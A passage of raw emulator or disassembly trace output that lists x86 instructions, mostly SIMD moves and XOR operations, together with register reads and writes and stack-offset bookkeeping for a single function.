for ESP -0x8 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x42703b: mov eax, dword ptr [ebp + 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x8020 for stack size 0x10000 0x42703e: mov dword ptr [ebp - 0x4c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x427044: push eax, regs_read: [30, 19], regs_write: [30] 0x42704d: push eax, regs_read: [30, 19], regs_write: [30] 0x42704e: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x427054: push eax, regs_read: [30, 19], regs_write: [30] 0x42705a: push dword ptr [ebp + 0x14], regs_read: [30, 20], regs_write: [30] 0x427060: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x427063: push ebx, regs_read: [30, 21], regs_write: [30] 0x427064: push dword ptr [ebp - 0x48], regs_read: [30, 20], regs_write: [30] 0x427067: push eax, regs_read: [30, 19], regs_write: [30] 0x427070: push 0x40, regs_read: [30], regs_write: [30] 0x427072: push eax, regs_read: [30, 19], regs_write: [30] 0x42707b: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x34 and offset 0x7ffc for stack size 0x10000 0x427082: pop ebx, regs_read: [30], regs_write: [30, 21] 0x427088: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x30 and offset 0x8000 for stack size 0x10000 0x42708a: pop ebp, regs_read: [30], regs_write: [30, 20] 0x427090: push ebx, regs_read: [30, 21], regs_write: [30] 0x427091: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x42709c: push ebp, regs_read: [30, 20], regs_write: [30] 0x42709d: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x4270a0: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP -0x4 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x4270a4: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x4270ac: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x4270b3: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x4 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x4270b6: mov edx, dword ptr [ebx + 8], regs_read: [21], regs_write: [24] 0x4270b9: mov eax, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [19] 0x4270bc: push esi, regs_read: [30, 29], regs_write: [30] 0x4270bd: mov esi, dword ptr [ebx + 0x14], regs_read: [21], regs_write: [29] 0x4270c0: mov ecx, esi, regs_read: [29], regs_write: [22] 0x4270c2: push edi, regs_read: [30, 23], regs_write: [30] 0x4270c3: mov edi, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [23] 0x4270c6: mov dword ptr [ebp - 0x4c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x4270c9: mov edi, dword ptr [ebx + 0x18], regs_read: [21], regs_write: [23] 0x4270ce: mov dword ptr [ebp - 0x74], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 saving data to stack: 0 4 0x4270d1: mov edi, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x4270d4: mov dword ptr [ebp - 0x78], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7f88 for stack size 0x10000 saving data to stack: 0 4 0x4270d7: mov dword ptr [ebp - 0x70], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x4270ea: mov dword ptr [ebp - 0x7c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f84 for stack size 0x10000 saving data to stack: 0 4 0x4270f0: mov dword ptr [ebp - 0x6c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 saving data to stack: 0 4 0x4270f3: mov esi, dword ptr [ebx + 0x14], regs_read: [21], regs_write: [29] 0x4270f6: mov dword ptr [ebp - 0x68], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x427113: mov dword ptr [ebp - 0x54], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 saving data to stack: 0 4 0x427120: mov dword ptr [ebp - 0x58], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x42712d: mov dword ptr [ebp - 0x60], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 4 0x42713b: movaps xmmword ptr [ebp - 0x170], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 saving data to stack: 0 16 0x427147: movaps xmmword ptr [ebp - 0x2b0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7d50 for stack size 0x10000 saving data to stack: 0 16 0x42715d: movaps xmmword ptr [ebp - 0x260], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7da0 for stack size 0x10000 saving data to stack: 0 16 0x427164: movaps xmmword ptr [ebp - 0x240], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7dc0 for stack size 0x10000 saving data to stack: 0 16 0x427175: mov dword ptr [ebp - 0x64], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x427180: movaps xmmword ptr [ebp - 0x270], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7d90 for stack size 0x10000 saving data to stack: 0 16 0x427191: movaps xmmword ptr [ebp - 0x250], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7db0 for stack size 0x10000 saving data to stack: 0 16 0x427198: movaps xmmword ptr [ebp - 0x180], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 saving data to stack: 0 16 0x42719f: mov dword ptr [ebp - 0x5c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 saving data to stack: 0 4 0x4271b9: movaps xmmword ptr [ebp - 0x280], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7d80 for stack size 0x10000 saving data to stack: 0 16 0x4271c0: movaps xmm4, xmmword ptr [ebp - 0x170], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 0x4271c7: movaps xmmword ptr [ebp - 0x1e0], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 saving data to stack: 0 16 0x4271ce: movaps xmmword ptr [ebp - 0x220], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7de0 for stack size 0x10000 saving data to stack: 0 16 0x4271d5: movaps xmmword ptr [ebp - 0x1b0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7e50 for stack size 0x10000 saving data to stack: 0 16 0x4271dc: movaps xmmword ptr [ebp - 0x290], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7d70 for stack size 0x10000 saving data to stack: 0 16 0x4271e3: movaps xmmword ptr [ebp - 0x2a0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7d60 for stack size 0x10000 saving data to stack: 0 16 0x4271ea: movaps xmmword ptr [ebp - 0xb0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x4271f1: mov dword ptr [ebp - 0x50], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x4271f4: mov esi, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 0x4271f9: mov edx, dword ptr [edx + 0x34], regs_read: [24], regs_write: [24] 0x4271fc: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x4271ff: movaps xmm2, xmmword ptr [0x4c9c80], regs_read: (), regs_write: [124] 0x427206: movaps xmm6, xmmword ptr [ebp - 0x2b0], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7d50 for stack size 0x10000 0x427213: movaps xmmword ptr [ebp - 0x1d0], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7e30 for stack size 0x10000 saving data to stack: 0 16 0x42721a: movaps xmm5, xmmword ptr [ebp - 0x280], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7d80 for stack size 0x10000 0x42722c: movaps xmm0, xmmword ptr [0x4c9c90], regs_read: (), regs_write: [122] 0x42723e: mov dword ptr [esi], ecx, regs_read: [29, 22], regs_write: () 0x427240: mov ecx, dword ptr [ebp - 0x78], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7f88 for stack size 0x10000 0x427247: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x42724a: movaps xmmword ptr [ebp - 0x1a0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 saving data to stack: 0 16 0x427259: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x42725c: mov dword ptr [ecx + 0x34], edx, regs_read: [22, 24], regs_write: () 0x427263: mov ecx, 0xa, regs_read: (), regs_write: [22] 0x42726c: movaps xmm2, xmmword ptr [ebp - 0x270], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7d90 for stack size 0x10000 0x427273: movaps xmmword ptr [ebp - 0x150], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 saving data to stack: 0 16 0x42727a: movaps xmm2, xmmword ptr [ebp - 0xb0], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 0x427281: movaps xmmword ptr [ebp - 0x160], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 saving data to stack: 0 16 0x427288: movaps xmm2, xmmword ptr [ebp - 0x180], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 0x42728f: movaps xmmword ptr [ebp - 0x110], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x427296: movaps xmm2, xmmword ptr [ebp - 0x260], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7da0 for stack size 0x10000 0x42729d: movaps xmmword ptr [ebp - 0x1c0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 saving data to stack: 0 16 0x4272a4: movaps xmm2, xmmword ptr [ebp - 0x2a0], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7d60 for stack size 0x10000 0x4272ab: movaps xmmword ptr [ebp - 0x100], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x4272b2: movaps xmm2, xmmword ptr [ebp - 0x240], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7dc0 for stack size 0x10000 0x4272b9: movaps xmmword ptr [ebp - 0xd0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x4272c0: movaps xmmword ptr [ebp - 0xe0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 16 0x4272c7: movaps xmm2, xmm4, regs_read: [126], regs_write: [124] 0x4272ca: movaps xmm4, xmmword ptr [ebp - 0x250], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7db0 for stack size 0x10000 0x4272d1: movaps xmmword ptr [ebp - 0xa0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x4272d8: movaps xmm1, xmmword ptr [ebp - 0x290], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7d70 for stack size 0x10000 0x4272df: movaps xmmword ptr [ebp - 0x210], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7df0 for stack size 0x10000 saving data to stack: 0 16 0x4272e6: movaps xmmword ptr [ebp - 0x140], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x4272ed: movaps xmmword ptr [ebp - 0x190], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x4272f4: movaps xmmword ptr [ebp - 0x130], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x4272fb: movaps xmmword ptr [ebp - 0xc0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x427310: movaps xmm6, xmmword ptr [ebp - 0x120], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7ee0 for stack size 0x10000 0x427317: movaps xmm7, xmmword ptr [ebp - 0x90], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7f70 for stack size 0x10000 0x42731e: movaps xmm1, xmmword ptr [ebp - 0x130], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x427325: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x42732c: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x427339: pxor xmm1, xmm4, regs_read: [123, 126], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42733d: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427341: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x427348: movaps xmmword ptr [ebp - 0xf0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 16 0x42734f: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x42735c: pxor xmm4, xmmword ptr [ebp - 0xa0], regs_read: [126, 20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7f60 for stack size 0x10000 0x427364: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427368: movaps xmm0, xmmword ptr [ebp - 0xf0], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f10 for stack size 0x10000 0x427373: movaps xmmword ptr [ebp - 0xa0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x42737a: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x427387: pxor xmm2, xmmword ptr [ebp - 0xc0], regs_read: [124, 20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 0x42738f: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427393: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x42739a: movaps xmmword ptr [ebp - 0x1f0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7e10 for stack size 0x10000 saving data to stack: 0 16 0x4273a1: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x4273ae: pxor xmm3, xmmword ptr [ebp - 0x100], regs_read: [125, 20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7f00 for stack size 0x10000 0x4273b6: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4273ba: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x4273c5: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x4273c8: movaps xmmword ptr [ebp - 0x200], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7e00 for stack size 0x10000 saving data to stack: 0 16 0x4273d9: pxor xmm1, xmmword ptr [ebp - 0x130], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x4273e1: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4273e5: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x4273ec: movaps xmmword ptr [ebp - 0xc0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x4273f3: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x427400: pxor xmm4, xmm7, regs_read: [126, 129], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427404: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427408: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x42740f: movaps xmmword ptr [ebp - 0x130], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x427416: movaps xmm7, xmm0, regs_read: [122], regs_write: [129] 0x427423: pxor xmm7, xmmword ptr [ebp - 0x190], regs_read: [129, 20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 0x42742b: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42742f: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x427436: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x427443: pxor xmm1, xmmword ptr [ebp - 0x1a0], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 0x42744b: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42744f: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x42745a: movaps xmmword ptr [ebp - 0x100], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x427461: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x42746e: pxor xmm1, xmmword ptr [ebp - 0x110], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 0x427476: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42747a: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x427485: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x427488: movaps xmmword ptr [ebp - 0x230], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7dd0 for stack size 0x10000 saving data to stack: 0 16 0x427499: pxor xmm5, xmmword ptr [ebp - 0x1d0], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7e30 for stack size 0x10000 0x4274a1: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4274a5: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x4274b0: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x4274bd: pxor xmm2, xmmword ptr [ebp - 0xe0], regs_read: [124, 20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f20 for stack size 0x10000 0x4274c5: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4274c9: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x4274d4: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x4274e1: pxor xmm3, xmmword ptr [ebp - 0x1c0], regs_read: [125, 20], regs_write: [125] adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 0x4274e9: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4274ed: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x4274f4: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x427501: pxor xmm1, xmm6, regs_read: [123, 128], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427505: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427509: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x427510: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x42751d: pxor xmm6, xmmword ptr [ebp - 0x140], regs_read: [128, 20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 0x427525: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427529: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x427530: movaps xmmword ptr [ebp - 0x110], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x427537: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x427544: pxor xmm4, xmmword ptr [ebp - 0x150], regs_read: [126, 20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 0x42754c: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427550: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x427557: movaps xmmword ptr [ebp - 0x140], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x42755e: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x42756b: movaps xmmword ptr [ebp - 0x90], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x427572: movaps xmm6, xmmword ptr [ebp - 0x90], regs_read: [20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7f70 for stack size 0x10000 0x427579: pxor xmm6, xmmword ptr [ebp - 0x130], regs_read: [128, 20], regs_write: [128] adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 0x427581: movaps xmmword ptr [ebp - 0x90], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x427588: movaps xmm4, xmmword ptr [ebp - 0x90], regs_read: [20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7f70 for stack size 0x10000 0x42758f: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427593: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x42759e: movaps xmmword ptr [ebp - 0x90], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x4275a5: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x4275b2: pxor xmm4, xmmword ptr [ebp - 0x160], regs_read: [126, 20], regs_write: [126] adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 0x4275ba: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4275be: movaps xmm0, xmmword ptr [ebp - 0xf0], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f10 for stack size 0x10000 0x4275cd: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x4275da: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4275de: movaps xmmword ptr [ebp - 0x120], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 16 0x4275e5: movaps xmm1, xmmword ptr [ebp - 0x120], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ee0 for stack size 0x10000 0x4275ec: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4275f0: movaps xmm0, xmmword ptr [ebp - 0x90], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f70 for stack size 0x10000 0x4275fb: movaps xmmword ptr [ebp - 0x120], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 16 0x427602: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x42760f: pxor xmm6, xmm2, regs_read: [128, 124], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427613: movaps xmmword ptr [ebp - 0xe0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 16 0x42761a: movaps xmm2, xmmword ptr [ebp - 0xe0], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f20 for stack size 0x10000 0x427621: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427625: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x427630: movaps xmmword ptr [ebp - 0xe0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 16 0x427637: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x427644: pxor xmm2, xmm3, regs_read: [124, 125], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x427648: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42764c: movaps xmmword ptr [ebp - 0x1c0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 saving data to stack: 0 16 0x427653: movaps xmm0, xmmword ptr [ebp - 0xe0], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f20 for stack size 0x10000 0x427662: movaps xmm6, xmm0, regs_read: [122], regs_write: [128] 0x427665: movaps xmm1, xmmword ptr [ebp - 0x140], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 0x427676: pxor xmm6, xmm5, regs_read: [128, 127], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42767a: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42767e: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x427689: movaps xmm5, xmm0, regs_read: [122], regs_write: [127] 0x42768c: movaps xmmword ptr [ebp - 0x1d0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7e30 for stack size 0x10000 saving data to stack: 0 16 0x42769d: pxor xmm5, xmmword ptr [ebp - 0xf0], regs_read: [127, 20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7f10 for stack size 0x10000 0x4276a5: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4276a9: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x4276b4: movaps xmm3, xmm0, regs_read: [122], regs_write: [125] 0x4276b7: movaps xmmword ptr [ebp - 0xf0], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 16 0x4276c8: pxor xmm3, xmm7, regs_read: [125, 129], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4276cc: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x4276d0: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x4276d7: movaps xmmword ptr [ebp - 0x190], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for 